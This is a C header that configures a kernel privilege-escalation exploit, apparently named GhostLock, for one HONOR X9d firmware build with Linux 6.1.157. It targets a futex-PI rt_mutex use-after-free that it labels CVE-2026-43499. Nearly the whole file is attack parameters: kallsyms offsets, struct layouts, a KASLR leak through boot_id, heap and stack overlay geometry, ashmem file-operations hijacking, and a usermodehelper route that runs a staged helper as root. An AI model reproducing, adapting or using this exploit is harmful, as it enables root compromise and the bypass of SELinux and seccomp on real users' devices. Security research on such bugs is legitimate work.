#ifndef TARGET_H
#define TARGET_H

/* HONOR X9d (MTN-NX1, HNMTN-Q1) — MagicOS 10.0.0.190 C636E10R103P1 (spcseas/C636)
 *
 *   kernel 6.1.157-android14-11-g3416ba8f00e3-ab15314546  (GKI android14-6.1, 4K pages)
 *   build  HONOR/MTN-NX1/HNMTN-Q1:16/HONORMTN-N21/10.0.0.190C636E10R103P1:user/release-keys
 *
 * Build with:
 *   make TARGET=mtn-nx1/r103/6.1.157-android14-11-g3416ba8f00e3-ab15314546 \
 *     CORE=core61 ANDROID_NDK_HOME=/path/to/android-ndk
 *
 * This is a 6.1 kernel, so it is built against core61 rather than the 6.6
 * core66 or 6.12 core612. core61 is this repository's android14-6.1 core,
 * derived from the same GhostLock tree core66 came from, with the waiter
 * model and credential constants adjusted to the 6.1 layouts below.
 *
 * Where every number came from:
 *
 *   - Global symbol addresses (the *_OFF block) were read from the image's
 *     kallsyms, extracted with vmlinux-to-elf from the boot.img of
 *     MTN-N21 10.0.0.190(C636E10R201P1)_Firmware_MagicOS 10.0_0501AHTL.zip.
 *     The R201/R103 packages differ only in cust/preload; the base package's
 *     kernel image is shared and its version string matches the device
 *     exactly (image reports 6.1.157-android14-11-g3416ba8f00e3-ab15314546
 *     #1 SMP PREEMPT Wed Apr 29 20:49:34 UTC 2026; the device reports the
 *     same via `cat /proc/version`).
 *
 *   - Struct field offsets (task_struct, cred, mm_struct, pipe_*,
 *     file_operations, page/slab, rt_mutex_waiter, workqueue, selinux_state,
 *     subprocess_info, completion) were read from the kernel's own embedded
 *     BTF (CONFIG_DEBUG_INFO_BTF=y), so they are this build's exact layouts.
 *
 *   - The futex-PI bug is present. remove_waiter() is out-of-line at image
 *     offset 0x1014668 and operates on `current` (mrs x20, sp_el0; then
 *     `str xzr, [x20, #0x950]` for pi_blocked_on) rather than on
 *     waiter->task, and rt_mutex_start_proxy_lock+0x40 calls it on the
 *     failure path. That is the unfixed shape of CVE-2026-43499; the stable
 *     fix for the 6.1 series first shipped in 6.1.175 and this kernel is
 *     6.1.157. The same disassembly re-confirms FAKE_TASK_PI_LOCK_OFF
 *     (0x924), FAKE_TASK_PI_WAITERS_OFF (0x938), FAKE_TASK_PI_TOP_TASK_OFF
 *     (0x948), FAKE_TASK_PI_BLOCKED_ON_OFF (0x950) and WAITER_LOCK_OFF
 *     (0x38).
 *
 *   - 6.1's rt_mutex waiter trees are PLAIN rb trees, not the augmented
 *     prio/deadline trees 6.6 uses: task_blocks_on_rt_mutex() inserts with
 *     rb_insert_color() and remove_waiter() erases with rb_erase(), and the
 *     only per-waiter ordering fields read at insert time are waiter->prio
 *     (0x44) and waiter->deadline (0x48). There is no augmented propagation
 *     to keep consistent; the write primitive is the plain rb_node link
 *     fixup, same as the tree walk the 6.6 model relies on.
 *
 *   - The pselect/futex stack overlay was read statically, the way pmg110's
 *     was scoped before booting: __arm64_sys_pselect6 consumes 0x90 of stack
 *     and core_sys_select 0x1c0 with stack_fds at sp+0x50;
 *     __arm64_sys_futex consumes 0x70 and do_futex 0x60, and
 *     futex_wait_requeue_pi's rt_mutex_waiter sits at sp+0x98 of its 0x1b0
 *     frame. Both chains share the syscall-entry frames above the named
 *     functions, so they cancel: the freed waiter lands at
 *     (0x70+0x60+0x1b0) - (0x90+0x1c0) - (0x98-0x50) = 0x18 bytes above
 *     stack_fds, i.e. waiter word +3. That lands task (waiter+0x30 -> word 9)
 *     and lock (waiter+0x38 -> word 10) inside the user-controlled zone, so
 *     the overlay is feasible. NOT yet measured on QEMU or hardware.
 *
 * Unverified numbers, marked where they are below:
 *   - P0_KERNEL_PHYS_LOAD: the ABL is encrypted (HONOR signed boot), so this
 *     is the value the upstream Qualcomm port measured for the SM8xxx ABL
 *     family (DRAM + 0x28000000). It must be confirmed on hardware; the
 *     payload accepts GHOSTLOCK_PHYS_LOAD=0x... to override without a
 *     rebuild.
 *   - MM_ORDER: the mm_cachep slab order is a runtime SLUB choice, notable
 *     only for the heap spray geometry. 3 carries over from pmg110; verify
 *     on device.
 */

#define BUILD_VARIANT_LABEL "ghostlock_honor_x9d"
#define BUILD_FINGERPRINT "honor/mtn-nx1"
/* Struct-layout identity of this header; must match the .layout of whichever
 * offsets.h entry the running kernel selects. See core61/device_offsets.h. */
#define TARGET_LAYOUT_ID "mtn-nx1-6.1"

/* ---------------------------------------------------------------- memory ---
 * VA_BITS=39 — CONFIG_ARM64_VA_BITS_39 in the embedded .config; _text is
 * 0xffffffc008000000 in the image kallsyms.
 */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL

/* DRAM base. Qualcomm's universal DDR base; the DTB /memory node is filled
 * by the bootloader at runtime (all-zero in the image), so this is the
 * platform constant rather than a DTB reading. */
#define P0_PHYS_OFFSET 0x80000000ULL

/* Physical address the bootloader loads the kernel Image at.
 *
 * HONOR's ABL is encrypted (the .text region of abl.elf is an
 * opaque/signed blob), so this could not be read out of the firmware. The
 * value is the one the upstream Qualcomm GhostLock port measured for the
 * SM8xxx ABL family — DRAM + 0x28000000 — taken as the same-generation
 * default for SM6375 (milos). It is a per-SoC-config constant.
 *
 * A wrong value fails silently: the write lands in mapped RAM with no crash
 * and no effect. To check against a running device, or to override without
 * a rebuild:
 *     adb shell su -c 'grep -i "Kernel code" /proc/iomem'
 *     GHOSTLOCK_PHYS_LOAD=0x... <payload>
 */
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
#endif

/* Conservative bounds, not measured spans. The linear map for VA_BITS=39
 * runs to 0xffffffc000000000; the device has 12 GB of DRAM contiguous from
 * P0_PHYS_OFFSET, well inside these. Widening only costs scan time. */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
/* Verified against the image: 0xfffffffe00000000 appears as an immediate in
 * the kernel's page<->pfn paths and 0xffffffbc00000000 does not. */
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ------------------------------------------- KernelSnitch geometry ---------
 * These describe kernel-side allocator and hash-table shapes, so they belong
 * to a kernel build the same way the struct offsets do.
 *
 * MM_STRUCT_SZ is the mm_cachep object size, not sizeof(struct mm_struct).
 * mm_cache_init() asks for:
 *     sizeof(struct mm_struct) + cpumask_size()
 * with SLAB_HWCACHE_ALIGN. BTF says sizeof = 960 (0x3c0), the embedded
 * .config has CONFIG_NR_CPUS=32 and no CONFIG_CPUMASK_OFFSTACK, so
 * cpumask_size() = 8, and rounding 0x3c8 up to the 64-byte cache line gives
 * 0x400. The scan enumerates candidates as slab_base + k*MM_STRUCT_SZ, so a
 * wrong value here means it steps straight past the real object.
 */
#define MM_STRUCT_SZ 0x400
/* mm_cachep slab order — runtime SLUB choice; 3 carries over from pmg110
 * (whose 1280-byte object used order 3). 0x400 objects => 32 per 32K slab.
 * Verify on device. */
#define MM_ORDER 3

/* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()).
 * futex_hash() masks with (futex_hashsize - 1), so this MUST be a power of
 * two. 8 possible CPUs on this device (cat /sys/devices/system/cpu/possible
 * = 0-7) -> 2048. */
#define FUTEX_HASHSIZE 2048

/* Kernel heap pointers carry a tag in bits [59:56] only when KASAN_HW_TAGS
 * is active. This kernel has CONFIG_KASAN_HW_TAGS=y and CONFIG_ARM64_MTE=y
 * compiled in, but the SoC (SM6375, Cortex-A78/A55) has no MTE hardware —
 * the device reports AT_HWCAP2 without the MTE bit — and the command line
 * carries kasan=off. Either alone would leave slab pointers untagged.
 * Measured on device, not inherited. */
#define KS_MTE_TAGGED 0

/* Collision threshold for KernelSnitch's timing side channel: a futex whose
 * hash-bucket walk takes more than this many times an empty bucket counts as
 * a collision. A property of the SoC's memory system, not of the kernel.
 * Carried over from pmg110 (10x); sweep with GHOSTLOCK_KS_THRESHOLD only if
 * a run shows accepted times near the threshold. */
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (kallsyms) --- */
#define INIT_TASK_OFF          0x0201f640ULL
#define INIT_CRED_OFF          0x02031aa8ULL
#define INIT_UTS_NS_OFF        0x021a2cb0ULL
#define EMPTY_ZERO_PAGE_OFF    0x02201000ULL
#define ROOT_TASK_GROUP_OFF    0x02208580ULL
/* &selinux_state.enforcing -- a bool at struct offset 0 (6.1 keeps it in the
 * state struct, there is no standalone selinux_enforcing symbol). */
#define SELINUX_ENFORCING_OFF  0x0225a420ULL
#define KPTR_RESTRICT_OFF      0x0201d078ULL
/* no security_hook_active_capable_* symbol on this 6.1 build */
#define CAP_CAPABLE_ACTIVE_OFF 0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x015cf288ULL
#define SECURITY_HOOK_HEADS_OFF 0x015ceb78ULL
#define KMALLOC_CACHES_OFF     0x015ce6b8ULL
#define ANON_PIPE_BUF_OPS_OFF  0x01109b90ULL
#define CONFIGFS_READ_ITER_OFF      0x0046475cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464c8cULL
/* 6.1 has no copy_splice_read (added in 6.4); generic_file_splice_read is
 * the same-era helper serving the same purpose. */
#define COPY_SPLICE_READ_OFF   0x003e6330ULL
#define NOOP_LLSEEK_OFF        0x00398a38ULL
/* C ashmem (drivers/staging/android/ashmem.c), CONFIG_ASHMEM=y built in.
 * This build registers an array of ashmem miscdevices (ashmem_miscs);
 * element [0] is /dev/ashmem with fops == &ashmem_fops, verified in the
 * image. ASHMEM_MISC_FOPS is the fops *pointer slot* the exploit swaps:
 * ashmem_miscs + offsetof(struct miscdevice, fops) = ashmem_miscs + 0x10. */
#define ASHMEM_MISC_FOPS_OFF   0x0217cb80ULL
#define ASHMEM_FOPS_OFF        0x01280dd0ULL
#define ASHMEM_IOCTL_OFF       0x00c392a8ULL
/* 6.1 names the compat handler compat_ashmem_ioctl, read from the fops
 * table in the image. */
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c39be0ULL
#define ASHMEM_MMAP_OFF        0x00c39c38ULL
#define ASHMEM_OPEN_OFF        0x00c39e58ULL
#define ASHMEM_RELEASE_OFF     0x00c39ee0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c3a000ULL

/* ----------------------------------------------------------------- KASLR --
 * slide.c and util.c read the symbol addresses below through *_IMAGE macros,
 * which common.h turns into linear-map (physmap PA | PAGE_OFFSET) aliases with
 * P0_DATA_ALIAS_CONST(). The <name>_OFF forms are image offsets read from this
 * build's kallsyms:
 *
 *   SLIDE_NFULNL_LOGGER_OBJECT_OFF    nfulnl_logger struct (image 0x020129d0)
 *   SLIDE_NFULNL_LOGGER_NAME_OFF      "nfnetlink_log" logger.name string.
 *                                     nfulnl_logger+0 == the name pointer; it
 *                                     holds 0xffffffc009528d9f (image off
 *                                     0x1528d9f), re-read as a string at that
 *                                     offset to confirm "nfnetlink_log".
 *   SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF
 *                                     random_table[BOOT_ID].data. random_table
 *                                     @0x2137c00 holds six ctl_table entries
 *                                     (0x40 each): poolsize, entropy_avail,
 *                                     write_wakeup_threshold,
 *                                     urandom_min_reseed_secs, then BOOT_ID (idx
 *                                     4, .data = &sysctl_bootid =
 *                                     0xffffffc00a27b498) and uuid (idx 5). The
 *                                     .data slot of boot_id is the writable
 *                                     kernel-location the rb_erase store feeds:
 *                                     overwrite it with the nfulnl_logger
 *                                     physmap alias and reading
 *                                     /proc/sys/kernel/random/boot_id UUID-prints
 *                                     the object's first 16 bytes, whose first 8
 *                                     are logger.name -> the slide.
 *   SLIDE_SYSCTL_BOOTID_OFF           &sysctl_bootid (0x0227b498), the value
 *                                     restore_slide_boot_id() writes back.
 *   SLIDE_INIT_TASK_OFF/_GROUP        the fake-waiter chain's task/group, all
 *                                     chosen to be immune to the slide.
 */
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x020129d0ULL
#define SLIDE_NFULNL_LOGGER_NAME_OFF    0x01528d9fULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02137d08ULL
#define SLIDE_SYSCTL_BOOTID_OFF         0x0227b498ULL
#define SLIDE_INIT_TASK_OFF             INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF       ROOT_TASK_GROUP_OFF

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
    (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* worker_thread()'s single `bl schedule` (the return-address worker_threads
 * park on) is at image 0x000daed0, so the recorded sched_blocked_reason
 * caller is 0x000daed0+4. Verified by disassembly: worker_thread starts at
 * 0x0dae34; the only bl targetting schedule/cl4 is at 0x0daed0. */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000daed4ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOP_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)

/* ---------------------------------------------------- pselect overlay ------
 * Statically derived above: the freed rt_mutex_waiter lands at stack_fds
 * word +3 on this build. Both the fops.c FOPS overlay and the slide overlay
 * keep the waiter at word +3 (measured: PSELECT_FOPS_SHIFT=+3 completes the
 * FOOTEN punch; +1 reboots the device). SLIDE_PSELECT_WORD_SHIFT is the word
 * the slide writer counts from zero; the FOPS overlay reuses the same value.
 */
#define PSELECT_WAITER_WORD_SHIFT 3
#define SLIDE_PSELECT_WORD_SHIFT 3
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

/* The app cannot use the tracefs slide source from its restricted domain, so
 * its boot_id fallback must take the fully shaped fake-task route. Leaving
 * the walk on INIT_TASK works for the shell/tracefs path but can follow live
 * PI state and panic before boot_id is rewritten. */
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL

/* Bootloader-seeded KASLR: the slide is gigabytes, 2 MiB aligned, and moves
 * only the virtual mapping.  Measured on this device: the boot-id leak sees a
 * multi-GB, 0x200000-aligned slide (e.g. 0x18b8400000) on every boot, and the
 * physmap alias of an image symbol does not follow it, so the p0 correction is
 * zero and the accepted slide window must span the whole KASLR range. */
#define SLIDE_KASLR_MIN 0ULL
#define SLIDE_KASLR_MAX 0x4000000000ULL
#define SLIDE_KASLR_ALIGN 0x200000ULL
#define SLIDE_P0_TRACKS_KASLR 0

/* ------------------------------------------- struct fields (BTF verified) --
 * Read from the kernel's own embedded BTF. These are 6.1 layouts and differ
 * from 6.6: the rt_mutex_waiter here has no separate prio/deadline pairs per
 * tree and file_operations is 0x110 with no fop_flags and compat at 0x58.
 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x18
#define WAITER_TASK_OFF           0x30
#define WAITER_LOCK_OFF           0x38
#define WAITER_WAKE_STATE_OFF     0x40
#define WAITER_PRIO_OFF           0x44
#define WAITER_DEADLINE_OFF       0x48
#define WAITER_WW_CTX_OFF         0x50

/* 6.1's rt_mutex_waiter keeps a single prio/deadline pair shared by both
 * trees, at 0x44/0x48 (after wake_state at 0x40), not the two pairs 6.6
 * carries at 0x18/0x40. The TREE_ and PI_ aliases point at the same fields;
 * the double store this produces in prepare_skb_payload is harmless because
 * both writes carry the same value. */
#define FAKE_WAITER_TREE_PRIO_OFF         0x44
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x48
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x44
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_PRIO_OFF     0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF              0x30
#define FAKE_WAITER_LOCK_OFF              0x38
#define FAKE_WAITER_WAKE_STATE_OFF        0x40
#define FAKE_WAITER_WW_CTX_OFF            0x50

/* task_struct — sizeof = 0x12c0, pi_lock/pi_waiters/pi_top_task/pi_blocked_on
 * re-confirmed from remove_waiter disassembly, the rest from BTF. */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x924
#define FAKE_TASK_PI_WAITERS_OFF     0x938
#define FAKE_TASK_PI_TOP_TASK_OFF    0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x950

/* mm_struct.owner sits in an anonymous struct; read out of the BTF. Not used
 * by the exploit. */
#define MM_OWNER_OFF             0x338
#define TASK_PID_OFF             0x630
#define TASK_TGID_OFF            0x634
#define TASK_REAL_PARENT_OFF     0x640
#define TASK_ATOMIC_FLAGS_OFF    0x5f0
#define TASK_REAL_CRED_OFF       0x830
#define TASK_CRED_OFF            0x838
#define TASK_COMM_OFF            0x848
#define TASK_TASKS_OFF           0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x900

/* cred — sizeof = 0xb0 (BTF). uid at 4 (not 8), caps block at 0x28..0x50,
 * security at 0x78. */
#define CRED_UID_OFF         4
#define CRED_SECUREBITS_OFF  0x24
#define CRED_CAPS_OFF        0x28
#define CRED_SECURITY_OFF    0x78
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF  4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* struct page/slab (BTF): page flags at 0, the big union at 0x08
 * (compound_head is its first tail-page member), the 4-byte _mapcount/
 * page_type union at 0x30, sizeof(page) = 0x40. 6.1 has a dedicated struct
 * slab (not overlaid on struct page), with slab_cache at 0x18 -- different
 * from 6.6's 0x08 page-union aliasing. */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18
#define STRUCT_PAGE_TYPE_OFF          0x30

/* pipe_inode_info — sizeof = 0xb8 (BTF: same field layout as 6.6).
 * The reclaimed object is the 32-entry pipe_buffer ring (0x28 each, 1280
 * bytes) from the kmalloc-cg-2k cache. */
#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

/* file_operations — sizeof = 0x110 (BTF; 6.1 has no fop_flags and pace
 * mmap_supported_flags at 0x68, so compat_ioctl is 0x58, mmap 0x60, open
 * 0x70, release 0x80, splice_read 0xc8, show_fdinfo 0xe0). */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF         0x60
#define FOPS_OPEN_OFF         0x70
#define FOPS_RELEASE_OFF      0x80
#define FOPS_SPLICE_READ_OFF  0xc8
#define FOPS_SHOW_FDINFO_OFF  0xe0

/* Exploit-internal payload page layout (not kernel dependent) */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080


/* usermodehelper root route -- the core61 install route: the kernel execs the
 * staged helper as root off a fake work_struct queued on system_unbound_wq
 * (root.c), and that helper is what serves -c and --late-load. This matches
 * what the tree planned for a 6.1 core: "core61 has the kernel exec the
 * helper". call_usermodehelper_exec_work is out-of-line in this build. */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d3718ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0200ae60ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
/* workqueue struct offsets, BTF-verified against this build (identical to
 * the 6.6 layouts pmg110 uses). */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#endif
